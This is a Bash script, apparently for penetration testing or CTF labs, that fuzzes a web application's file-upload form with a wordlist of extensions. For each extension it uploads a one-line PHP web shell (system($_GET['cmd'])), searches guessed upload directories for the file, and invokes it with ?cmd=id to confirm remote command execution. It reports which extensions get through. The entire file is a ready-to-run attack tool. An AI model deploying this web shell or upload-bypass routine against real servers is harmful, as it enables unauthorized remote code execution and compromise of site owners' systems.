#!/bin/bash

# ============================================
# ExtUp - Extension Upload Tester
# Tool for automated file upload extension fuzzing
# Author: Your Name
# License: MIT
# ============================================

# Cores para output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
NC='\033[0m' # No Color

# Função para exibir logo
show_logo() {
    echo -e "${CYAN}"
    echo "███████╗██╗  ██╗████████╗██╗   ██╗██████╗ "
    echo "██╔════╝╚██╗██╔╝╚══██╔══╝██║   ██║██╔══██╗"
    echo "█████╗   ╚███╔╝    ██║   ██║   ██║██████╔╝"
    echo "██╔══╝   ██╔██╗    ██║   ██║   ██║██╔═══╝ "
    echo "███████╗██╔╝ ██╗   ██║   ╚██████╔╝██║     "
    echo "╚══════╝╚═╝  ╚═╝   ╚═╝    ╚═════╝ ╚═╝     "
    echo -e "${NC}"
    echo -e "${GREEN}           Extension Upload Tester v1.0${NC}"
    echo -e "${YELLOW}        Automated file upload extension fuzzing${NC}"
    echo ""
}

# Configuração padrão
WORDLIST="/usr/share/seclists/Fuzzing/extensions-most-common.txt"
BASE_URL=""
URL_UPLOAD=""

# Função para mostrar ajuda
show_help() {
    show_logo
    echo "Uso: $0 -u <URL_DO_UPLOADER> [-w <WORDLIST>] [-b <BASE_URL>] [-h]"
    echo ""
    echo "Opções:"
    echo "  -u  URL do uploader (ex: http://192.168.9.117/internal/index.php)"
    echo "  -w  Caminho para wordlist de extensões (opcional)"
    echo "  -b  URL base onde os arquivos são salvos (opcional, tenta auto-detectar)"
    echo "  -h  Mostra esta ajuda"
    echo ""
    echo "Exemplos:"
    echo "  $0 -u http://192.168.9.117/internal/index.php"
    echo "  $0 -u http://192.168.9.117/internal/index.php -w /tmp/minha_lista.txt"
    echo "  $0 -u http://192.168.9.117/internal/index.php -b http://192.168.9.117/internal/uploads/"
    exit 0
}

# Parse dos argumentos
while getopts "u:w:b:h" opt; do
    case $opt in
        u) URL_UPLOAD="$OPTARG" ;;
        w) WORDLIST="$OPTARG" ;;
        b) BASE_URL="$OPTARG" ;;
        h) show_help ;;
        *) show_help ;;
    esac
done

# Verifica se URL foi fornecida
if [ -z "$URL_UPLOAD" ]; then
    echo -e "${RED}[!] Erro: URL do uploader é obrigatória!${NC}"
    show_help
fi

# Se BASE_URL não foi fornecida, tenta adivinhar
if [ -z "$BASE_URL" ]; then
    BASE_URL=$(dirname "$URL_UPLOAD")"/uploads/"
    echo -e "${YELLOW}[!] BASE_URL não fornecida. Tentando usar: $BASE_URL${NC}"
fi

# Verifica se a wordlist existe
if [ ! -f "$WORDLIST" ]; then
    echo -e "${YELLOW}[!] Wordlist não encontrada: $WORDLIST${NC}"
    
    if [ -f "/usr/share/seclists/Fuzzing/extensions-most-common.txt" ]; then
        WORDLIST="/usr/share/seclists/Fuzzing/extensions-most-common.txt"
        echo -e "${GREEN}[+] Usando wordlist padrão: $WORDLIST${NC}"
    elif [ -f "/usr/share/wordlists/seclists/Fuzzing/extensions-most-common.txt" ]; then
        WORDLIST="/usr/share/wordlists/seclists/Fuzzing/extensions-most-common.txt"
        echo -e "${GREEN}[+] Usando wordlist padrão: $WORDLIST${NC}"
    else
        echo -e "${RED}[!] Wordlist não encontrada. Por favor, instale o SecLists:${NC}"
        echo "    sudo apt install seclists -y"
        echo "    Ou forneça uma wordlist com -w"
        exit 1
    fi
fi

show_logo

echo -e "${GREEN}[+] Target URL: $URL_UPLOAD${NC}"
echo -e "${GREEN}[+] Wordlist: $WORDLIST${NC}"
echo -e "${GREEN}[+] Base URL: $BASE_URL${NC}"
echo "==========================================================="

# Cria arquivo base de teste
cat > base.php << 'EOF'
<?php system($_GET["cmd"]); ?>
EOF

# Contador
TOTAL=0
VALIDAS=0
SUCESSO_CODIGO=0

# Arquivos de saída
OUTPUT_VALIDAS="extensoes_validas_$(date +%Y%m%d_%H%M%S).txt"
OUTPUT_UPLOAD_ONLY="extensoes_upload_only_$(date +%Y%m%d_%H%M%S).txt"
OUTPUT_LOG="test_upload_$(date +%Y%m%d_%H%M%S).log"

# Lê cada extensão da wordlist
while IFS= read -r ext; do
    ext=$(echo "$ext" | tr -d ' .' | tr -d '\r')
    [ -z "$ext" ] && continue
    
    TOTAL=$((TOTAL + 1))
    TIMESTAMP=$(date +%s%N 2>/dev/null || date +%s)$RANDOM
    filename="test_${TIMESTAMP}.$ext"
    
    cp base.php "$filename"
    
    echo -ne "[*] Testando .$ext ... "
    
    response=$(curl -s -F "file=@$filename" -F "submit=Submit" "$URL_UPLOAD" 2>&1)
    
    if echo "$response" | grep -qi "Extension not allowed"; then
        echo -e " ${RED}❌ BLOQUEADO${NC}"
        echo "$ext: BLOQUEADO" >> "$OUTPUT_LOG"
    elif echo "$response" | grep -qi "error\|invalid\|denied"; then
        echo -e " ${RED}❌ REJEITADO${NC}"
        echo "$ext: REJEITADO" >> "$OUTPUT_LOG"
    else
        sleep 0.5
        if curl -s "$BASE_URL" 2>/dev/null | grep -q "$filename"; then
            echo -ne " ${GREEN}✅ UPLOAD OK${NC}"
            VALIDAS=$((VALIDAS + 1))
            
            exec_response=$(curl -s -m 5 "${BASE_URL}${filename}?cmd=id" 2>/dev/null)
            
            if echo "$exec_response" | grep -q "uid="; then
                echo -e " ${GREEN}✅ PHP EXECUTA! (VÁLIDO)${NC}"
                echo "$ext" >> "$OUTPUT_VALIDAS"
                SUCESSO_CODIGO=$((SUCESSO_CODIGO + 1))
            else
                echo -e " ${YELLOW}⚠️  UPLOAD OK, mas PHP não executa${NC}"
                echo "$ext (upload ok, PHP não roda)" >> "$OUTPUT_UPLOAD_ONLY"
            fi
        else
            FOUND=0
            for alt_path in "$BASE_URL" "http://$(echo "$BASE_URL" | cut -d'/' -f3)/uploads/" "http://$(echo "$BASE_URL" | cut -d'/' -f3)/files/"; do
                if curl -s "$alt_path" 2>/dev/null | grep -q "$filename"; then
                    echo -e " ${GREEN}✅ UPLOAD OK (em $alt_path)${NC}"
                    FOUND=1
                    break
                fi
            done
            
            if [ $FOUND -eq 0 ]; then
                echo -e " ${RED}❌ UPLOAD OK (mensagem) mas arquivo não encontrado${NC}"
                echo "$ext: upload OK mas arquivo não listado" >> "$OUTPUT_LOG"
            fi
        fi
    fi
    
    rm -f "$filename"
    
done < "$WORDLIST"

echo "==========================================================="
echo -e "${GREEN}[+] Teste concluído!${NC}"
echo "[+] Total testados: $TOTAL"
echo "[+] Uploads aceitos: $VALIDAS"
echo "[+] Extensões com execução PHP: $SUCESSO_CODIGO"
echo ""
echo "[+] Arquivos de saída gerados:"
echo "   - $OUTPUT_VALIDAS"
echo "   - $OUTPUT_UPLOAD_ONLY"
echo "   - $OUTPUT_LOG"
echo ""
echo "[+] Extensões que funcionaram (upload + PHP):"
if [ -f "$OUTPUT_VALIDAS" ] && [ -s "$OUTPUT_VALIDAS" ]; then
    cat "$OUTPUT_VALIDAS"
else
    echo "   Nenhuma extensão válida encontrada"
fi